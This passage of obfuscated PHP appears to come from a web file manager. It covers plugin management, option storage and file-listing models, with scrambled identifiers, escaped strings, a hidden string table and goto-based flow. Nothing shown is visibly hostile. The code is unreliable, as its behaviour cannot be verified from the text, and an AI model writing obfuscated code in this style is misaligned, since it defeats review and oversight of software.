$ÉÉ¦µçö, $øõæºå¯ = true) { $àĞİùÓ‘ =& $_SERVER[¼¥ÊĞÙÌ]; $ïÆŒ‘Ï = PLUGIN_DIR . $¡Ì¡šÁ . $àĞİùÓ‘[2118]; if (!is_array($ÉÉ¦µçö) || !is_array($ÉÉ¦µçö[$àĞİùÓ‘[2116]]) || $ÉÉ¦µçö[$àĞİùÓ‘[824]] != 1 || !is_file($ïÆŒ‘Ï)) { return !1; } if (KodUser::isRoot()) { if ($GLOBALS[$àĞİùÓ‘[6]][$àĞİùÓ‘[2119]] || !$GLOBALS[$àĞİùÓ‘[6]][$àĞİùÓ‘[2120]]) { return !0; } $êŠ§œ¬Ç = explode($àĞİùÓ‘[50], strtolower($GLOBALS[$àĞİùÓ‘[6]][$àĞİùÓ‘[2120]])); return in_array(strtolower($¡Ì¡šÁ), $êŠ§œ¬Ç) ? !1 : !0; } if ($øõæºå¯ && !Action($àĞİùÓ‘[2121])->checkAuth($¡Ì¡šÁ)) { return !1; } return !0; } public function unInstall($¦ğíÃ‡É) { $­·İ‚áÒ =& $_SERVER[¼¥ÊĞÙÌ]; $¾®‡µ = $this->loadList($¦ğíÃ‡É); if (file_exists(PLUGIN_DIR . $¦ğíÃ‡É)) { Hook::apply($¦ğíÃ‡É . $­·İ‚áÒ[2122]); } $this->remove($¾®‡µ[$­·İ‚áÒ[478]]); } public function changeStatus($‡¥¬ÒË, $ƒ‡Ê¹½ ) { $ã¹ç“Ëé =& $_SERVER[¼¥ÊĞÙÌ]; $¤™ÙñÜ = $this->loadList($‡¥¬ÒË); if ($ƒ‡Ê¹½ ) { Hook::apply($‡¥¬ÒË . $ã¹ç“Ëé[2123]); } $this->update($¤™ÙñÜ[$ã¹ç“Ëé[478]], array($ã¹ç“Ëé[2124] => $ƒ‡Ê¹½ )); } public function appRegist($Ôßâ—¢, $¿¾ÜâÜ¦) { $ãŒ´ß¾ =& $_SERVER[¼¥ÊĞÙÌ]; $¦ïà›Ç£ = $this->loadList($Ôßâ—¢); if ($¦ïà›Ç£) { $this->update($¦ïà›Ç£[$ãŒ´ß¾[478]], array($ãŒ´ß¾[2116] => $¿¾ÜâÜ¦)); } else { $üâ¢„ = array($ãŒ´ß¾[32] => $Ôßâ—¢, $ãŒ´ß¾[2116] => $¿¾ÜâÜ¦, $ãŒ´ß¾[824] => 0, $ãŒ´ß¾[6] => $this->getConfigDefault($Ôßâ—¢)); $this->insert($üâ¢„); } } public function getConfigDefault($ŒÍœÚç„) { $âÜÛ» ¦ =& $_SERVER[¼¥ÊĞÙÌ]; $‘ƒ¤ãÎé = array(); $µö˜™ú = $this->getPackageJson($ŒÍœÚç„); if (!$µö˜™ú && is_array($µö˜™ú[$âÜÛ» ¦[2125]])) { return $‘ƒ¤ãÎé; } foreach ($µö˜™ú[$âÜÛ» ¦[2125]] as $Õª½¹‘ => $ªº»Šš) { if (!isset($ªº»Šš[$âÜÛ» ¦[453]]) || isset($‘ƒ¤ãÎé[$Õª½¹‘])) { continue; } $‘ƒ¤ãÎé[$Õª½¹‘] = $ªº»Šš[$âÜÛ» ¦[453]]; } return $‘ƒ¤ãÎé; } public function getPackageJson($—¶ş¥°) { return Hook::apply($—¶ş¥° . $_SERVER[¼¥ÊĞÙÌ][2126]); } public function getConfig($å«Ò†·, $²ëÉƒäŸ = false) { $³çöØ°ï =& $_SERVER[¼¥ÊĞÙÌ]; $ñ¤÷Áæ = array(); $×¬Š¸Õ± = $this->loadList($å«Ò†·); if ($×¬Š¸Õ± && is_array($×¬Š¸Õ±[$³çöØ°ï[6]])) { $ñ¤÷Áæ = $×¬Š¸Õ±[$³çöØ°ï[6]]; } if (!$ñ¤÷Áæ || $²ëÉƒäŸ) { $ñ¤÷Áæ = $this->getConfigDefault($å«Ò†·); } return $ñ¤÷Áæ; } public function setConfig($ˆ´´µûà, $·“ìÇúı = false) { $Ñ‡£â÷Ÿ =& $_SERVER[¼¥ÊĞÙÌ]; $¶Í»´ªõ = $this->loadList($ˆ´´µûà); if (!$¶Í»´ªõ) { return !1; } $­Æ³ì…ê = $¶Í»´ªõ[$Ñ‡£â÷Ÿ[6]]; if ($·“ìÇúı == !1) { $­Æ³ì…ê = array(); $·“ìÇúı = $this->getConfigDefault($ˆ´´µûà); } foreach ($·“ìÇúı as $¿±¤¹ => $î‚‰ ÒŞ) { $­Æ³ì…ê[$¿±¤¹] = is_string($î‚‰ ÒŞ) ? trim($î‚‰ ÒŞ) : $î‚‰ ÒŞ; } $this->update($¶Í»´ªõ[$Ñ‡£â÷Ÿ[478]], array($Ñ‡£â÷Ÿ[6] => $­Æ³ì…ê)); } public function viewList() { $³ç¬Ê± =& $_SERVER[¼¥ÊĞÙÌ]; $‰€µ„¨ = $this->loadList(); $this->pluginScan($‰€µ„¨); $‰€µ„¨ = $this->loadPluginList(); $âÉÎ·àÖ = array(); foreach ($‰€µ„¨ as $Ì¯êŞâ => $Ÿ¡è»ƒ©) { $¿ø¿İ‰ = $Ÿ¡è»ƒ©; unset($Ÿ¡è»ƒ©[$³ç¬Ê±[2116]], $Ÿ¡è»ƒ©[$³ç¬Ê±[6]]); $§Ç¢¼âæ = PLUGIN_DIR . $Ÿ¡è»ƒ©[$³ç¬Ê±[32]] . $³ç¬Ê±[2118]; if (!is_file($§Ç¢¼âæ)) { continue; } $Ş§®è§ = Hook::apply($Ÿ¡è»ƒ©[$³ç¬Ê±[32]] . $³ç¬Ê±[2126]); if (!is_array($Ş§®è§)) { continue; } $âÉÎ·àÖ[$Ì¯êŞâ] = array_merge($Ÿ¡è»ƒ©, $Ş§®è§); if ($¿ø¿İ‰[$³ç¬Ê±[6]][$³ç¬Ê±[1703]] != $Ş§®è§[$³ç¬Ê±[1677]]) { Hook::apply($Ÿ¡è»ƒ©[$³ç¬Ê±[32]] . $³ç¬Ê±[2123]); $¿ø¿İ‰[$³ç¬Ê±[6]][$³ç¬Ê±[1703]] = $Ş§®è§[$³ç¬Ê±[1677]]; $this->update($Ÿ¡è»ƒ©[$³ç¬Ê±[478]], array($³ç¬Ê±[6] => $¿ø¿İ‰[$³ç¬Ê±[6]])); } } return $âÉÎ·àÖ; } private function loadPluginList() { $ÄÏ›ƒĞÕ =& $_SERVER[¼¥ÊĞÙÌ]; $ß“ş™Í¨ = $this->loadList(); if (strtolower(MOD) == $ÄÏ›ƒĞÕ[2127]) { return $ß“ş™Í¨; } $Ñ¾®÷Ì• = Hook::trigger($ÄÏ›ƒĞÕ[2128], $ß“ş™Í¨); if ($ß“ş™Í¨ && !$Ñ¾®÷Ì•) { die; } return $Ñ¾®÷Ì• ? $Ñ¾®÷Ì• : $ß“ş™Í¨; } private function pluginScan($“æü€íî) { $ûÊòÍïî =& $_SERVER[¼¥ÊĞÙÌ]; recursion_dir(PLUGIN_DIR, $ßø¿ÀØº, $‡óÉÂ³ã, 0); foreach ($ßø¿ÀØº as $˜¦àŠğŞ) { $¸‰É¾Ñ = get_path_this($˜¦àŠğŞ); if (isset($“æü€íî[$¸‰É¾Ñ]) || !file_exists($˜¦àŠğŞ . $ûÊòÍïî[2129]) || !file_exists($˜¦àŠğŞ . $ûÊòÍïî[2118])) { continue; } Hook::apply($¸‰É¾Ñ . $ûÊòÍïî[2123]); } } } goto DíÛ¬»»„ë; EÑÜ§¹ŒÖ¿: class ModelBaseLight { public $optionType = ''; public $modelType = "\x53\x79\x73\x74\145\155\x4f\x70\164\x69\x6f\x6e"; public $field = array(); public function listData($ƒĞÔéÜ¶ = false, $ñ‹«¸­ = "\155\157\144\151\x66\171\x54\151\155\x65", $„ª»ôì = false) { $ïçñ¤³× = Model($this->modelType)->get(!1, $this->optionType, !0); $Ùı¶ŒÃ§ = array_values($ïçñ¤³×); if ($Ùı¶ŒÃ§ && $Ùı¶ŒÃ§[0] && !is_array($Ùı¶ŒÃ§[0])) { Model($this->modelType)->cacheRemove($this->optionType); $ïçñ¤³× = Model($this->modelType)->get(!1, $this->optionType, !0); } if (!$ïçñ¤³×) { return $ƒĞÔéÜ¶ ? null : array(); } if (!$ƒĞÔéÜ¶) { $ïçñ¤³× = array_filter(array_values($ïçñ¤³×)); return array_sort_by($ïçñ¤³×, $ñ‹«¸­, $„ª»ôì); } return $ïçñ¤³×[$_SERVER[¼¥ÊĞÙÌ][475] . $ƒĞÔéÜ¶]; } public function insert($®’ÛÓŒ) { $ñâ™’ÕË =& $_SERVER[¼¥ÊĞÙÌ]; $®’ÛÓŒ = array_field_key($®’ÛÓŒ, $this->field); $‹ÈÖË´ = Model($this->modelType)->get($ñâ™’ÕË[476], $this->optionType . $ñâ™’ÕË[477]); $‹ÈÖË´ = $‹ÈÖË´ ? $‹ÈÖË´ : 0; $®’ÛÓŒ[$ñâ™’ÕË[478]] = ++$‹ÈÖË´; $®’ÛÓŒ[$ñâ™’ÕË[234]] = time(); $®’ÛÓŒ[$ñâ™’ÕË[88]] = time(); Model($this->modelType)->set($ñâ™’ÕË[476], $‹ÈÖË´, $this->optionType . $ñâ™’ÕË[477]); Model($this->modelType)->set($ñâ™’ÕË[475] . $‹ÈÖË´, $®’ÛÓŒ, $this->optionType); return $‹ÈÖË´; } public function update($¡„‹œÄ, $š•®ßşÍ) { $­‹ãĞß” =& $_SERVER[¼¥ÊĞÙÌ]; $š•®ßşÍ = array_field_key($š•®ßşÍ, $this->field); $µ«¹ÓùÕ = $this->listData($¡„‹œÄ); if (!$µ«¹ÓùÕ || !$¡„‹œÄ) { return !1; } $š•®ßşÍ = array_merge($µ«¹ÓùÕ, $š•®ßşÍ); $š•®ßşÍ[$­‹ãĞß”[88]] = time(); return Model($this->modelType)->set($­‹ãĞß”[475] . $¡„‹œÄ, $š•®ßşÍ, $this->optionType); } public function remove($ª†ôåë¶) { if (!$ª†ôåë¶) { return !1; } return Model($this->modelType)->remove($_SERVER[¼¥ÊĞÙÌ][475] . $ª†ôåë¶, $this->optionType); } public function clear() { $Ã´Ú³öò =& $_SERVER[¼¥ÊĞÙÌ]; Model($this->modelType)->remove($Ã´Ú³öò[476], $this->optionType . $Ã´Ú³öò[477]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($˜ë„Öµ½, $‘Ò¢èşú) { if (!$‘Ò¢èşú) { return !1; } $…¢ü€×î = $this->listData(); $…¢ü€×î = array_to_keyvalue($…¢ü€×î, $˜ë„Öµ½); return isset($…¢ü€×î[$‘Ò¢èşú]) ? $…¢ü€×î[$‘Ò¢èşú] : !1; } public function findByName($¯«ƒ°Ì ) { return $this->findByKey($_SERVER[¼¥ÊĞÙÌ][32], $¯«ƒ°Ì ); } protected function resetData($º©·Ä›ì) { $ú‹Ñş§ =& $_SERVER[¼¥ÊĞÙÌ]; $º©·Ä›ì = is_array($º©·Ä›ì) ? $º©·Ä›ì : array(); $Ìˆ²ş´Ğ = array(); for ($Ê—­Ù­ = 0; $Ê—­Ù­ < count($º©·Ä›ì); $Ê—­Ù­++) { $Ìˆ²ş´Ğ[$ú‹Ñş§[475] . $º©·Ä›ì[$Ê—­Ù­][$ú‹Ñş§[478]]] = $º©·Ä›ì[$Ê—­Ù­]; } return Model($this->modelType)->set($Ìˆ²ş´Ğ, !1, $this->optionType); } private function getAutoName($ÈäüÊ»Ğ) { $Æû±§œú = array_to_keyvalue($this->listData(), $_SERVER[¼¥ÊĞÙÌ][32]); if (!$Æû±§œú || !isset($Æû±§œú[$ÈäüÊ»Ğ])) { return $ÈäüÊ»Ğ; } for ($œ¯‹Úµ = 1; $œ¯‹Úµ < count($Æû±§œú); $œ¯‹Úµ++) { $°ÂÔæ¤ğ = $ÈäüÊ»Ğ . "\x28{$œ¯‹Úµ}\x29"; if (!isset($Æû±§œú[$°ÂÔæ¤ğ])) { return $°ÂÔæ¤ğ; } } return $°ÂÔæ¤ğ; } } class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($µ£Š¿×´ = false, $âôØÊš = '', $ÍÄÔò‘û = false) { $“úİ²õï =& $_SERVER[¼¥ÊĞÙÌ]; $×çÍ·ôú = $this->cacheGet($âôØÊš); $¸¢â†“µ = $this->optionDefault($âôØÊš); $¸¢â†“µ = is_array($¸¢â†“µ) ? $¸¢â†“µ : array(); if (is_array($×çÍ·ôú)) { $×çÍ·ôú = array_merge($¸¢â†“µ, $×çÍ·ôú); return $µ£Š¿×´ ? isset($×çÍ·ôú[$µ£Š¿×´]) ? $×çÍ·ôú[$µ£Š¿×´] : null : $×çÍ·ôú; } $¼á•Æ˜° = $this->filterWhere(array($“úİ²õï[33] => $âôØÊš)); $×çÍ·ôú = $this->where($¼á•Æ˜°)->select(); $×çÍ·ôú = array_to_keyvalue($×çÍ·ôú, $“úİ²õï[97], $“úİ²õï[453]); foreach ($×çÍ·ôú as $ìŒ­š­õ => $è°Ù¹°“) { if ($ÍÄÔò‘û || in_array($ìŒ­š­õ, $this->jsonField)) { $×çÍ·ôú[$ìŒ­š­õ] = json_decode($è°Ù¹°“, !0); } } $this->cacheSet($âôØÊš, $×çÍ·ôú); $×çÍ·ôú = array_merge($¸¢â†“µ, $×çÍ·ôú); return $µ£Š¿×´ ? $×çÍ·ôú[$µ£Š¿×´] : $×çÍ·ôú; } public function set($ÉËÏÉ§İ, $ŸÅ¾ù÷œ = false, $Ïë‹¡Ä = '') { $Ã÷¢Ïš =& $_SERVER[¼¥ÊĞÙÌ]; $this->cacheRemove($Ïë‹¡Ä); $˜ğ€÷ıê = array(); $¥Íú¬Ê = is_array($ÉËÏÉ§İ) ? $ÉËÏÉ§İ : array($ÉËÏÉ§İ => $ŸÅ¾ù÷œ); foreach ($¥Íú¬Ê as $ÕÈ¢™øÅ => $Æ•¤´’½) { if (is_array($Æ•¤´’½)) { $Æ•¤´’½ = json_encode_force($Æ•¤´’½); } $this->checkLength($Æ•¤´’½, !1, $this->tableName . $Ã÷¢Ïš[4] . $ÉËÏÉ§İ); $Æ•¤´’½ = self::textEncode($Æ•¤´’½); $¥Íú¬Ê = array($Ã÷¢Ïš[33] => $Ïë‹¡Ä, $Ã÷¢Ïš[97] => $ÕÈ¢™øÅ, $Ã÷¢Ïš[453] => $Æ•¤´’½); $˜ğ€÷ıê[] = $this->filterWhere($¥Íú¬Ê); } if (!$˜ğ€÷ıê) { return !0; } $š“Ÿöì  = $this->cacheKey($Ã÷¢Ïš[479]); CacheLock::lock($š“Ÿöì ); $…âÇšâû = $this->addAll($˜ğ€÷ıê, array(), !0); CacheLock::unlock($š“Ÿöì ); return $…âÇšâû; } protected function optionDefault($¬Â©Æ¶Ù = '') { return !1; } public function setDeep($«ÄŞŠü®, $·õ ¡‹ = false, $¨éÑÁë = '') { $èèñÙÒ’ = explode($_SERVER[¼¥ÊĞÙÌ][10], $«ÄŞŠü®); $úÎÖÀ¢× = $this->get(); array_set_value($úÎÖÀ¢×, $«ÄŞŠü®, $·õ ¡‹); $this->set($èèñÙÒ’[0], $úÎÖÀ¢×[$èèñÙÒ’[0]], $¨éÑÁë); } public function remove($Îí±Çê«, $õñëÜ¡¸ = '') { $ï‹¯Ñ€¢ =& $_SERVER[¼¥ÊĞÙÌ]; $this->cacheRemove($õñëÜ¡¸); $‡Ç½ö×Ç = $this->filterWhere(array($ï‹¯Ñ€¢[97] => $Îí±Çê«, $ï‹¯Ñ€¢[33] => $õñëÜ¡¸)); if (is_null($Îí±Çê«)) { unset($‡Ç½ö×Ç[$ï‹¯Ñ€¢[97]]); } return $this->where($‡Ç½ö×Ç)->delete(); } public function cacheSet($™×Úõş÷, $İÀàã“ş = false) { return Cache::set($this->cacheKey($™×Úõş÷), $İÀàã“ş); } public function cacheGet($¹”ÍßèÁ) { return Cache::get($this->cacheKey($¹”ÍßèÁ)); } public function cacheRemove($àº†Ã°³) { return Cache::remove($this->cacheKey($àº†Ã°³)); } protected function filterWhere($û×À¥Óü) { return $û×À¥Óü; } protected function cacheKey($ß¥–‰èÜ) { return $ß¥–‰èÜ; } } class SourceListModel extends ModelBase { protected $tableName = "\x69\157\137\x73\x6f\165\162\143\x65"; protected $tableMeta = array("\164\141\142\x6c\145\116\x61\x6d\x65" => "\151\x6f\x5f\x73\157\x75\x72\x63\x65\x5f\155\x65\164\x61", "\155\x65\164\141\x46\x69\x65\x6c\144" => "\163\157\165\x72\x63\145\x49\104"); protected $dataAuto = array(array("\155\157\x64\x69\146\171\124\151\155\145", "\164\x69\x6d\x65", "\x69\156\163\x65\x72\164", "\146\165\x6e\x63\x74\151\157\156"), array("\x63\x72\x65\141\164\145\x54\x69\155\x65", "\164\151\155\x65", "\x69\156\x73\x65\162\164", "\x66\165\x6e\x63\164\151\157\156"), array("\x76\x69\145\x77\x54\x69\155\x65", "\164\151\x6d\x65", "\151\x6e\163\145\x72\x74", "\x66\165\x6e\x63\164\x69\157\x6e")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($®â Ñù½) { return $this->listSource(array($_SERVER[¼¥ÊĞÙÌ][480] => $®â Ñù½)); } public function typeName($…ó®š¥Ï) { static $Á·˜Æå» = array(self::TYPE_SYSTEM => "\163\171\163\x74\145\155", self::TYPE_USER => "\x75\163\145\x72", self::TYPE_GROUP => "\x67\x72\x6f\x75\160"); return $Á·˜Æå»[$…ó®š¥Ï . $_SERVER[¼¥ÊĞÙÌ][12]]; } public function sourceListInfo($òÁŒé½ì, $Ş¸²İ©Ø = false) { $îÆ†™à€ =& $_SERVER[¼¥ÊĞÙÌ]; $òÁŒé½ì = $òÁŒé½ì ? $òÁŒé½ì : array(); $òÁŒé½ì = array_filter(array_unique($òÁŒé½ì)); if (!$òÁŒé½ì) { return array(); } $Şæ¬Úã‰ = $this->where(array($îÆ†™à€[194] => array($îÆ†™à€[7], $òÁŒé½ì)))->select(); $this->_listDataApply($Şæ¬Úã‰, $Ş¸²İ©Ø); return array_to_keyvalue($Şæ¬Úã‰, $îÆ†™à€[194]); } public function pathInfoFilter(&$Â¯ê´ÆÇ) { $êŞŒí¸ñ =& $_SERVER[¼¥ÊĞÙÌ]; static $³Å¨ÍŒî = false; static $ÄŸ¹˜¼¥ = false; static $…ĞÔæ÷¨ = false; if (!$³Å¨ÍŒî) { $²öÌŞ‹¶ = $êŞŒí¸ñ[481]; $²öÌŞ‹¶ .= $êŞŒí¸ñ[482]; $²öÌŞ‹¶ .= $êŞŒí¸ñ[483]; $é§‰Ñş = $êŞŒí¸ñ[484]; $¢¿µô®ğ = explode($êŞŒí¸ñ[50], $é§‰Ñş); $³Å¨ÍŒî = explode($êŞŒí¸ñ[50], $²öÌŞ‹¶); $ÄŸ¹˜¼¥ = array(); foreach ($³Å¨ÍŒî as $ø¿»û‹) { if (in_array($ø¿»û‹, $¢¿µô®ğ)) { continue; } $ÄŸ¹˜¼¥[] = $ø¿»û‹; } $…ĞÔæ÷¨ = explode($êŞŒí¸ñ[50], $êŞŒí¸ñ[485]); } foreach ($…ĞÔæ÷¨ as $ô€úÒ) { if (isset($Â¯ê´ÆÇ[$ô€úÒ])) { $Â¯ê´ÆÇ[$ô€úÒ] = intval($Â¯ê´ÆÇ[$ô€úÒ]); } } $Â¯ê´ÆÇ[$êŞŒí¸ñ[87]] = $êŞŒí¸ñ[486] . $Â¯ê´ÆÇ[$êŞŒí¸ñ[194]] . $êŞŒí¸ñ[487]; $Â¯ê´ÆÇ[$êŞŒí¸ñ[33]] = $Â¯ê´ÆÇ[$êŞŒí¸ñ[488]] == 1 ? $êŞŒí¸ñ[78] : $êŞŒí¸ñ[233]; $Â¯ê´ÆÇ[$êŞŒí¸ñ[191]] = $this->typeName($Â¯ê´ÆÇ[$êŞŒí¸ñ[191]]); if ($Â¯ê´ÆÇ[$êŞŒí¸ñ[488]] != 1) { $Â¯ê´ÆÇ[$êŞŒí¸ñ[169]] = $Â¯ê´ÆÇ[$êŞŒí¸ñ[489]]; unset($Â¯ê´ÆÇ[$êŞŒí¸ñ[489]]); } $İıÚƒœ¯ = $³Å¨ÍŒî; if (isset($Â¯ê´ÆÇ[$êŞŒí¸ñ[490]]) && $Â¯ê´ÆÇ[$êŞŒí¸ñ[490]][$êŞŒí¸ñ[491]] == -1) { $İıÚƒœ¯ = $ÄŸ¹˜¼¥; } $Â¯ê´ÆÇ = array_field_key($Â¯ê´ÆÇ, $İıÚƒœ¯); return $Â¯ê´ÆÇ; } public function listUserFav() { $¸¦®ÕÎ» =& $_SERVER[¼¥ÊĞÙÌ]; $§Ï—«²Ü = Model($¸¦®ÕÎ»[492])->listData(); $Œƒºâ–È = array_filter_by_field($§Ï—«²Ü, $¸¦®ÕÎ»[33], $¸¦®ÕÎ»[493]); $Œƒºâ–È = array_to_keyvalue($Œƒºâ–È, $¸¦®ÕÎ»[12], $¸¦®ÕÎ»[87]); if ($Œƒºâ–È) { $åşÔæØ¢ = $this->listSource(array($¸¦®ÕÎ»[494] => array($¸¦®ÕÎ»[495], $Œƒºâ–È))); } $åşÔæØ¢ = array_to_keyvalue($åşÔæØ¢[$¸¦®ÕÎ»[448]], $¸¦®ÕÎ»[194]); foreach ($§Ï—«²Ü as &$‹Î¼¬Ä†) { $‹Î¼¬Ä† = array($¸¦®ÕÎ»[496] => $‹Î¼¬Ä†[$¸¦®ÕÎ»[478]], $¸¦®ÕÎ»[497] => $‹Î¼¬Ä†[$¸¦®ÕÎ»[32]], $¸¦®ÕÎ»[498] => $‹Î¼¬Ä†[$¸¦®ÕÎ»[87]], $¸¦®ÕÎ»[499] => $‹Î¼¬Ä†[$¸¦®ÕÎ»[33]], $¸¦®ÕÎ»[500] => $‹Î¼¬Ä†[$¸¦®ÕÎ»[234]], $¸¦®ÕÎ»[501] => $‹Î¼¬Ä†[$¸¦®ÕÎ»[88]]); if ($‹Î¼¬Ä†[$¸¦®ÕÎ»[33]] == $¸¦®ÕÎ»[493] && $åşÔæØ¢[$‹Î¼¬Ä†[$¸¦®ÕÎ»[87]]]) { $‹Î¼¬Ä†[$¸¦®ÕÎ»[90]] = $åşÔæØ¢[$‹Î¼¬Ä†[$¸¦®ÕÎ»[87]]]; } } unset($‹Î¼¬Ä†); return $§Ï—«²Ü; } public function listUserTag($ÀïÓ») { $Ş©œüñ¤ =& $_SERVER[¼¥ÊĞÙÌ]; if ($ÀïÓ» && !is_array($ÀïÓ»)) { $ÀïÓ» = array($ÀïÓ»); } $”ÆûÎÓÅ = Model($Ş©œüñ¤[502])->listData(); $°ü¿×ã€ = array(); $Û¿ÜŠ¨ë = array(); foreach ($”ÆûÎÓÅ as $ƒ¡äÄ›ª) { $°„ÁôŠ¤ = $ƒ¡äÄ›ª[$Ş©œüñ¤[87]]; if (!$°„ÁôŠ¤) { continue; } if (!isset($Û¿ÜŠ¨ë[$°„ÁôŠ¤])) { $Û¿ÜŠ¨ë[$°„ÁôŠ¤] = array(); } $Û¿ÜŠ¨ë[$°„ÁôŠ¤][] = $ƒ¡äÄ›ª[$Ş©œüñ¤[503]]; $°ü¿×ã€[$ƒ¡äÄ›ª[$Ş©œüñ¤[87]]] = $ƒ¡äÄ›ª; } $æ—¼±ÓÁ = array(); $¬Ğô•”Ú = array(); $¾õò³Œ¢ = array(); foreach ($Û¿ÜŠ¨ë as $ååæ»°€ => $‡¶•ã£È) { $ô·¿ò°Æ = !0; if (!$ÀïÓ») { $æ—¼±ÓÁ[] = $ååæ»°€; continue; } foreach ($ÀïÓ» as $Ç‚¥Àú) { if (!in_array($Ç‚¥Àú, $‡¶•ã£È)) { $ô·¿ò°Æ = !1; break; } } if (!$ô·¿ò°Æ) { continue; } if (!is_numeric($ååæ»°€)) { $Í¾Ô€Ùš = $°ü¿×ã€[$ååæ»°€]; $âÅå„òˆ = array($Ş©œüñ¤[32] => $Í¾Ô€Ùš[$Ş©œüñ¤[32]], $Ş©œüñ¤[87] => $Í¾Ô€Ùš[$Ş©œüñ¤[87]], $Ş©œüñ¤[33] => $Í¾Ô€Ùš[$Ş©œüñ¤[33]], $Ş©œüñ¤[90] => array($Ş©œüñ¤[504] => 1), $Ş©œüñ¤[235] => !0); if ($Í¾Ô€Ùš[$Ş©œüñ¤[33]] == $Ş©œüñ¤[233]) { $¾õò³Œ¢[] = $âÅå„òˆ; } if ($Í¾Ô€Ùš[$Ş©œüñ¤[33]] == $Ş©œüñ¤[78]) { $¬Ğô•”Ú[] = $âÅå„òˆ; } continue; } $æ—¼±ÓÁ[] = $ååæ»°€; } if ($æ—¼±ÓÁ) { $É¢›çöŠ = $this->listSource(array($Ş©œüñ¤[494] => array($Ş©œüñ¤[495], $æ—¼±ÓÁ))); } $É¢›çöŠ = $É¢›çöŠ ? $É¢›çöŠ : array($Ş©œüñ¤[85] => array(), $Ş©œüñ¤[86] => array()); $É¢›çöŠ[$Ş©œüñ¤[85]] = array_merge($É¢›çöŠ[$Ş©œüñ¤[85]], $¬Ğô•”Ú); $É¢›çöŠ[$Ş©œüñ¤[86]] = array_merge($É¢›çöŠ[$Ş©œüñ¤[86]], $¾õò³Œ¢); if (isset($É¢›çöŠ[$Ş©œüñ¤[445]]) && count($æ—¼±ÓÁ) == $É¢›çöŠ[$Ş©œüñ¤[445]][$Ş©œüñ¤[446]]) { return $É¢›çöŠ; } $ÊÛõßĞ = array(); $©¯õèõ† = array_to_keyvalue($É¢›çöŠ[$Ş©œüñ¤[85]], $Ş©œüñ¤[12], $Ş©œüñ¤[194]); $ª·¥–Æù = array_to_keyvalue($É¢›çöŠ[$Ş©œüñ¤[86]], $Ş©œüñ¤[12], $Ş©œüñ¤[194]); $¥ºÛıŒŠ = array_merge($ª·¥–Æù, $©¯õèõ†); foreach ($æ—¼±ÓÁ as $°„ÁôŠ¤) { if (!in_array($°„ÁôŠ¤, $¥ºÛıŒŠ)) { $ÊÛõßĞ[] = $°„ÁôŠ¤; } } if ($ÊÛõßĞ) { Model($Ş©œüñ¤[505])->removeBySource($ÊÛõßĞ); } return $É¢›çöŠ; } public function listUserRecycle() { $§½Š Æ =& $_SERVER[¼¥ÊĞÙÌ]; $¬Á¶ù¾Í = Model($§½Š Æ[506])->listData(); if (!$¬Á¶ù¾Í) { return array(); } $å¢˜åĞ¹ = array($§½Š Æ[494] => array($§½Š Æ[495], $¬Á¶ù¾Í), $§½Š Æ[507] => 1); return $this->listSource($å¢˜åĞ¹); } public function listSource($×ÓœçØş, $À†õûíŸ = 3000, $à Í«® = false) { $ª÷¥Éõ’ =& $_SERVER[¼¥ÊĞÙÌ]; if (!isset($×ÓœçØş[$ª÷¥Éõ’[508]])) { $×ÓœçØş[$ª÷¥Éõ’[508]] = 0; } if (isset($×ÓœçØş[$ª÷¥Éõ’[193]]) && $×ÓœçØş[$ª÷¥Éõ’[193]] == $ª÷¥Éõ’[231]) { $×ÓœçØş[$ª÷¥Éõ’[489]] = array($ª÷¥Éõ’[509], $ª÷¥Éõ’[12]); } $‘ŠØ±éÆ = $ª÷¥Éõ’[510]; $±èªîÖŒ = $this->field($‘ŠØ±éÆ)->_makeOrder()->where($×ÓœçØş)->selectPage($À†õûíŸ); $this->_listPageCheck($±èªîÖŒ, $‘ŠØ±éÆ, $×ÓœçØş); $this->_listDataApply($±èªîÖŒ[$ª÷¥Éõ’[448]], $à Í«®); $this->_listMake($±èªîÖŒ); return $±èªîÖŒ; } private function _listPageCheck(&$“Íàù¿ì, $öşÃÙé·, $êíÏ×œº) { $ ë´ñè¹ =& $_SERVER[¼¥ÊĞÙÌ]; if (!is_array($“Íàù¿ì[$ ë´ñè¹[445]])) { return; } $ìÒâÛú’ = $“Íàù¿ì[$ ë´ñè¹[445]]; if ($ìÒâÛú’[$ ë´ñè¹[447]] <= 1) { return; } if ($ìÒâÛú’[$ ë´ñè¹[446]] >= 100000) { return; } if (Model($ ë´ñè¹[511])->get($ ë´ñè¹[512]) != $ ë´ñè¹[513]) { return; } $öşÃÙé· = str_replace(array($ ë´ñè¹[53], $ ë´ñè¹[420], $ ë´ñè¹[288]), $ ë´ñè¹[12], $öşÃÙé·); $öşÃÙé· = $ ë´ñè¹[514] . str_replace($ ë´ñè¹[50], $ ë´ñè¹[515], $öşÃÙé·) . $ ë´ñè¹[516]; $¶‰ë¬Ü¤ = $ ë´ñè¹[517]; $¶‰ë¬Ü¤ = $¶‰ë¬Ü¤ . $ ë´ñè¹[518]; $ŠÉå½’ = $ìÒâÛú’[$ ë´ñè¹[442]] * ($ìÒâÛú’[$ ë´ñè¹[431]] - 1) . $ ë´ñè¹[50] . $ìÒâÛú’[$ ë´ñè¹[442]]; $·’×íë¾ = $this->_makeOrder(!0); $¿¾¶¹Âö = $ ë´ñè¹[514] . str_replace($ ë´ñè¹[50], $ ë´ñè¹[515], $·’×íë¾[0]); if (strpos($¿¾¶¹Âö, $ ë´ñè¹[519])) { $¿¾¶¹Âö = str_replace($ ë´ñè¹[519], $ ë´ñè¹[520], $¿¾¶¹Âö); } else { $¿¾¶¹Âö .= $ ë´ñè¹[521] . $·’×íë¾[1]; } $ı—Ÿ¹Ş‹ = array(); foreach ($êíÏ×œº as $ßÉí›ší => $Ìµ˜ôáô) { $ı—Ÿ¹Ş‹[$ ë´ñè¹[514] . $ßÉí›ší] = $Ìµ˜ôáô; } $this->alias($ ë´ñè¹[522])->field($öşÃÙé·)->limit($ŠÉå½’)->order($¿¾¶¹Âö); $—™±ş‡© = $this->join($¶‰ë¬Ü¤)->where($ı—Ÿ¹Ş‹)->select(); if ($—™±ş‡©) { $“Íàù¿ì[$ ë´ñè¹[448]] = $—™±ş‡©; } } protected function _makeOrder($ÓÛ¸â€² = false) { $û¬æÑÁÒ =& $_SERVER[¼¥ÊĞÙÌ]; $ş¸á—Íí = 